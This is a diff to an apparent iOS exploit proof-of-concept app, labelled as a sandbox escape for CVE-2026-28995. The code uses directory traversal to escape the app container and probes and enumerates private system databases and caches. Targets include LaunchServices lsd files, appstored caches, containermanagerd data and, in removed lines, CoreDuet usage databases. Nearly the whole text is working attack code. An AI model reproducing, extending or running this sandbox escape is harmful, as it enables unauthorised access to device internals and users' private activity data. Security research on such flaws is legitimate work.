@@ -662,7 +662,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v6" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v7" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7254,13 +7254,12 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
 
     // ============================================================
-    // v6: First get REAL UUIDs, then verify access, then probe wider
+    // v7: Fix app name (UAFPoc), probe lsd DB, verify own files directly
     // ============================================================
 
     #define BASE @"../../../../../../../../../../../../../"
     #define TRYFILE(path) [[BASE stringByAppendingString:path] stringByExpandingTildeInPath]
 
-    // helper: probe a specific file, print size if found
     BOOL (^probeFile)(NSString*, NSMutableString*) = ^BOOL(NSString *sub, NSMutableString *out) {
         NSString *p = TRYFILE(sub);
         BOOL isDir = NO;
@@ -7279,15 +7278,13 @@ static void *iohid_threadCopyEvent(void *arg) {
         return ex;
     };
 
-    // Test 2: Get real UUIDs from within the app
+    // Test 2: Get real paths + verify own files exist directly (no sandbox escape)
     [log appendString:@"--- Test 2: Real container paths ---\n"];
     NSString *homePath = NSHomeDirectory();
     NSString *bundlePath = [[NSBundle mainBundle] bundlePath];
     [log appendFormat:@"  NSHomeDirectory: %@\n", homePath];
     [log appendFormat:@"  bundlePath: %@\n", bundlePath];
-    // Extract UUIDs from paths
-    // homePath: /var/mobile/Containers/Data/Application/{UUID}/
-    // bundlePath: /var/containers/Bundle/Application/{UUID}/SwiftSword.app
+    NSString *appName = [bundlePath lastPathComponent]; // e.g. UAFPoc.app
     NSArray *homeComps = [homePath pathComponents];
     NSArray *bundleComps = [bundlePath pathComponents];
     NSString *dataUUID = @"?", *bundleUUID = @"?";
@@ -7299,76 +7296,81 @@ static void *iohid_threadCopyEvent(void *arg) {
         if ([bundleComps[i] hasSuffix:@"Application"] && i+1 < bundleComps.count)
             bundleUUID = bundleComps[i+1];
     }
-    [log appendFormat:@"  dataUUID: %@\n  bundleUUID: %@\n", dataUUID, bundleUUID];
+    [log appendFormat:@"  dataUUID: %@\n  bundleUUID: %@\n  appName: %@\n", dataUUID, bundleUUID, appName];
 
-    // Test 3: Verify sandbox escape can read our OWN container files
-    [log appendString:@"\n--- Test 3: Verify access to own containers ---\n"];
-    // Try data container metadata
-    NSString *ownDataMeta = [NSString stringWithFormat:
+    // Verify own files exist via direct access (no traversal)
+    [log appendString:@"  Direct access check:\n"];
+    NSString *directMeta = [homePath stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
+    [log appendFormat:@"    own metadata.plist: %@\n", [fm fileExistsAtPath:directMeta] ? @"YES" : @"NO"];
+    NSString *directInfo = [[bundlePath stringByAppendingPathComponent:@"Info.plist"] stringByExpandingTildeInPath];
+    [log appendFormat:@"    own Info.plist: %@\n", [fm fileExistsAtPath:directInfo] ? @"YES" : @"NO"];
+    // Check what files ARE in our data container root
+    NSArray *rootItems = [fm contentsOfDirectoryAtPath:homePath error:nil];
+    [log appendFormat:@"    data root items: %@\n", [rootItems componentsJoinedByString:@", "]];
+
+    // Test 3: Verify sandbox escape to our own files (with correct app name)
+    [log appendString:@"\n--- Test 3: Verify sandbox escape to own files ---\n"];
+    NSString *ownMeta = [NSString stringWithFormat:
         @"var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist", dataUUID];
-    probeFile(ownDataMeta, log);
-    // Try bundle container iTunesMetadata
-    NSString *ownBundleMeta = [NSString stringWithFormat:
-        @"var/containers/Bundle/Application/%@/iTunesMetadata.plist", bundleUUID];
-    probeFile(ownBundleMeta, log);
-    // Try our own Info.plist via bundle
+    probeFile(ownMeta, log);
     NSString *ownInfo = [NSString stringWithFormat:
-        @"var/containers/Bundle/Application/%@/SwiftSword.app/Info.plist", bundleUUID];
+        @"var/containers/Bundle/Application/%@/%@/Info.plist", bundleUUID, appName];
     probeFile(ownInfo, log);
+    // Also try own Documents dir
+    NSString *ownDocs = [NSString stringWithFormat:
+        @"var/mobile/Containers/Data/Application/%@/Documents/", dataUUID];
+    probeFile(ownDocs, log);
 
-    // Test 4: containermanagerd — plist + wider DB guess
-    [log appendString:@"\n--- Test 4: containermanagerd wider probe ---\n"];
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/com.apple.containermanagerd.plist", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/containermanagerd.plist", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/state.plist", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/Cache.db", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/containers.db", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/db.sqlite", log);
-    // Also check if containermanagerd dir itself is readable as a file
-    // (it's a dir, but we check to confirm the traversal path works on dirs under /var/mobile)
-
-    // Test 5: CoreDuet — try directory existence first, then DB variants
-    [log appendString:@"\n--- Test 5: CoreDuet structure probe ---\n"];
-    probeFile(@"var/mobile/Library/CoreDuet/Knowledge/", log);
-    probeFile(@"var/mobile/Library/CoreDuet/People/", log);
-    probeFile(@"var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db", log);
-    probeFile(@"var/mobile/Library/CoreDuet/interactionC.db", log);
-
-    // Test 6: Try alternative directory enumeration methods
-    [log appendString:@"\n--- Test 6: Enumeration methods on containermanagerd ---\n"];
-    NSString *cmDir = TRYFILE(@"var/mobile/Library/Caches/com.apple.containermanagerd");
-    // Method 1: contentsOfDirectoryAtPath (known blocked)
-    NSArray *c1 = [fm contentsOfDirectoryAtPath:cmDir error:nil];
-    [log appendFormat:@"  contentsOfDirectory: %lu items\n", (unsigned long)c1.count];
-    // Method 2: enumeratorAtPath (might bypass)
-    NSDirectoryEnumerator *de = [fm enumeratorAtPath:cmDir];
-    NSArray *c2 = de ? [de allObjects] : nil;
-    [log appendFormat:@"  enumeratorAtPath: %lu items\n", (unsigned long)(c2 ? c2.count : 0)];
-    if (c2.count > 0) {
-        [log appendFormat:@"  first items: %@\n",
-            [[c2 subarrayWithRange:NSMakeRange(0, MIN(20, c2.count))] componentsJoinedByString:@", "]];
+    // Test 4: var/db/lsd/ — LaunchServices DB (MUST contain bundleID->path mappings)
+    [log appendString:@"\n--- Test 4: LaunchServices lsd DB ---\n"];
+    probeFile(@"var/db/lsd/lsd.db", log);
+    probeFile(@"var/db/lsd/csstore", log);
+    probeFile(@"var/db/lsd/trustCache.sqlite3", log);
+    probeFile(@"var/db/lsd/Cache.db", log);
+    probeFile(@"var/db/lsd/db.sqlite", log);
+    probeFile(@"var/db/lsd/com.apple.lsd.plist", log);
+    // Try enumeration on lsd dir
+    NSString *lsdDir = TRYFILE(@"var/db/lsd");
+    NSArray *lsdItems = [fm contentsOfDirectoryAtPath:lsdDir error:nil];
+    [log appendFormat:@"  contentsOfDirectory: %lu items\n", (unsigned long)lsdItems.count];
+    if (lsdItems.count == 0) {
+        NSArray *lsdSub = [fm subpathsOfDirectoryAtPath:lsdDir error:nil];
+        [log appendFormat:@"  subpathsOfDirectory: %lu items\n", (unsigned long)lsdSub.count];
     }
-    // Method 3: subpathsOfDirectoryAtPath
-    NSArray *c3 = [fm subpathsOfDirectoryAtPath:cmDir error:nil];
-    [log appendFormat:@"  subpathsOfDirectory: %lu items\n", (unsigned long)c3.count];
 
-    // Test 7: New paths not tried before
-    [log appendString:@"\n--- Test 7: New paths ---\n"];
-    // Backboard / runningboard (app lifecycle)
-    probeFile(@"var/mobile/Library/Caches/com.apple.backboardd/", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.runningboardd/", log);
-    // MobileInstallation new paths
-    probeFile(@"var/mobile/Library/Caches/com.apple.MobileInstallation/Cache.db", log);
-    probeFile(@"var/mobile/Library/Caches/com.apple.MobileInstallation/installCache.db", log);
-    // lsd directory check
-    probeFile(@"var/mobile/Library/Caches/com.apple.lsd/", log);
-    probeFile(@"var/db/lsd/", log);
-    // appstored dir check
-    probeFile(@"var/mobile/Library/Caches/com.apple.appstored/", log);
-    // Alternatives to container paths
-    probeFile(@"var/mobile/Applications/", log);
-    // Try known system plists
-    probeFile(@"System/Library/CoreServices/SystemVersion.plist", log);
+    // Test 5: appstored DB + enumeration
+    [log appendString:@"\n--- Test 5: appstored cache ---\n"];
+    probeFile(@"var/mobile/Library/Caches/com.apple.appstored/Cache.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.appstored/store.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.appstored/appstored.sqlite", log);
+    // Try to enumerate appstored
+    NSString *asDir = TRYFILE(@"var/mobile/Library/Caches/com.apple.appstored");
+    NSArray *asItems = [fm contentsOfDirectoryAtPath:asDir error:nil];
+    [log appendFormat:@"  contentsOfDirectory: %lu items\n", (unsigned long)asItems.count];
+    NSArray *asSub = [fm subpathsOfDirectoryAtPath:asDir error:nil];
+    [log appendFormat:@"  subpathsOfDirectory: %lu items\n", (unsigned long)asSub.count];
+
+    // Test 6: /var/mobile/Applications/ — legacy path
+    [log appendString:@"\n--- Test 6: /var/mobile/Applications/ ---\n"];
+    NSString *appsDir = TRYFILE(@"var/mobile/Applications");
+    NSArray *appsItems = [fm contentsOfDirectoryAtPath:appsDir error:nil];
+    [log appendFormat:@"  contentsOfDirectory: %lu items\n", (unsigned long)appsItems.count];
+    NSEnumerator *appsEnum = [fm enumeratorAtPath:appsDir];
+    NSArray *appsAll = appsEnum ? [appsEnum allObjects] : nil;
+    [log appendFormat:@"  enumeratorAtPath: %lu items\n", (unsigned long)(appsAll ? appsAll.count : 0));
+    if (appsAll.count > 0) {
+        [log appendFormat:@"  first: %@\n", [[appsAll subarrayWithRange:NSMakeRange(0, MIN(20, appsAll.count))] componentsJoinedByString:@", "]];
+    }
+
+    // Test 7: System version + read plist verification
+    [log appendString:@"\n--- Test 7: SystemVersion.plist ---\n"];
+    NSString *svPath = TRYFILE(@"System/Library/CoreServices/SystemVersion.plist");
+    NSDictionary *sv = [NSDictionary dictionaryWithContentsOfFile:svPath];
+    if (sv) {
+        [log appendFormat:@"  ProductVersion: %@\n", sv[@"ProductVersion"]];
+        [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
+        [log appendFormat:@"  ProductName: %@\n", sv[@"ProductName"]];
+    }
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
